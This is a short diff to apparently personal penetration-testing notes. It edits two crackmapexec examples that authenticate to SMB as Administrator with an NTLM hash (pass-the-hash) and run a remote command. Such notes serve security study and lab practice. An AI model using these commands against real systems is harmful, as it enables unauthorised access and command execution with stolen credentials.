@@ -50,9 +50,9 @@ session -K # to kill sessions.
 
 #### Using  \[crackmapexec]
 
-`crackmapexec smb $ip -u Administrator -H "<NITLM_hash>"` - authenticate with the creds.
+`crackmapexec smb $ip -u Administrator -H "<NITLM_hash ONLY>"` - authenticate with the creds.
 
-`crackmapexec smb $ip -u Administrator -H "<NITLM_hash>" -x "ipconfig"`  - we get the cmd result with some errors, but don't worry abt it (:
+`crackmapexec smb $ip -u Administrator -H "<NITLM_hash ONLY>" -x "ipconfig"`  - we get the cmd result with some errors, but don't worry abt it (:
 
 
 
